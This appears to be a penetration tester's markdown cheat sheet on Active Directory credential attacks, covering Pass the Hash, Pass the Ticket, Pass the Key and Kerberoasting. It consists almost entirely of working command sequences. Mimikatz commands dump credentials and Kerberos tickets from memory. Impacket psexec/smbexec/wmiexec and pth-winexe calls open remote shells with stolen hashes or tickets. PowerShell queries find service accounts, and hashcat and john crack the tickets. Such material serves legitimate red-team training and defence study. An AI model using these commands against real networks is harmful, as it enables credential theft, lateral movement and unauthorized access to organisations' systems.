# Hashes

## Pass the Hash

Use the hash to login in another machine as a local user without knowing its password. Works because NTLM hashes are static so if a user logs into different machines his hash will remain the same on each host.

```
lsadump::sam 
sekurlsa::logonpasswords
```

#### Authenticate with hash

```
pth-winexe -U <domain>/<user>%<NTLM> //<target ip> cmd

#impacket
smbexec.py <user>@<ip> -hashes <NTLM or :NT>
psexec.py <user>@<ip> -hashes <NTLM or :NT>
wmiexec.py <user>@<ip> -hashes <NTLM or :NT>

#mimikatz
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM or :NT> /run:powershell.exe
```

## Pass the Ticket

Loads a ticket in memory granting the current user access to the remote machine/service within the context of the current session.

```
sekurlsa::tickets /export
```

#### Run on Windows

```
kerberos::ptt <.krbi file>
.\PsExec.exe -accepteula \\<target host> cmd
```

#### Run on Linux

```
#convert and store the ticket file for impacket use
python ticket_converter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=<.ccache file path>

#start remote connection
python psexec.py <domain>/<user>@<host> -k -no-pass
python smbexec.py <domain>/<user>@<host> -k -no-pass
python wmiexec.py <domain>/<user>@<host> -k -no-pass
```

## Pass the Key

Obtain a TGT ticket by providing a valid NTLM hash, AES key or password. The obtained TGT token can then be used to access other machines.

#### Run on Windows

```
sekurlsa::ekeys

sekurlsa::pth /user:<user> /domain:<domain> /rc4:<hash> /run:"<cmd>"
sekurlsa::pth /user:<user> /domain:<domain> /aes128:<hash> /run:"<cmd>"
sekurlsa::pth /user:<user> /domain:<domain> /aes256:<hash> /run:"<cmd>"
```

#### Run on linux

```
python getTGT.py <domain_name>/<user_name> -hashes <NTLM hash>
python getTGT.py <domain_name>/<user_name> -hashes :<NT hash>
python getTGT.py <domain_name>/<user_name> -aesKey <AES>
python getTGT.py <domain_name>/<user_name>:<password>

export KRB5CCNAME=<ccache file>

#start remote connection
python psexec.py <domain>/<user>@<host> -k -no-pass
python smbexec.py <domain>/<user>@<host> -k -no-pass
python wmiexec.py <domain>/<user>@<host> -k -no-pass
```

## Kerberoast

Send a request to a TGT for a Kerberos token, dump it from memory, crack it locally to obtain access to the target. Vulnerable accounts need to have the flag `serverPrincipalName` set.

Enumerate remote targets

```
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl

get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
get-adobject -filter {serviceprincipalname -ne $null} -prop serviceprincipalname

setspn -T <domain> -Q */*
```

Enumerate  local sessions

```
klist
```

Request a Service Ticket from the target. The ticket will be stored in memory

```
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```

Dump the SPN ticket using Mimikatz

```
privilege::debug
token::elevate
kerberos::list /export
```

Crack the .kirbi file

```
hashcat -m 13100 --force <hashfile> <wordlist>
john --format=krb5tgs --wordlist=<wordlist> <hashfile>    #requires jumbo version
```
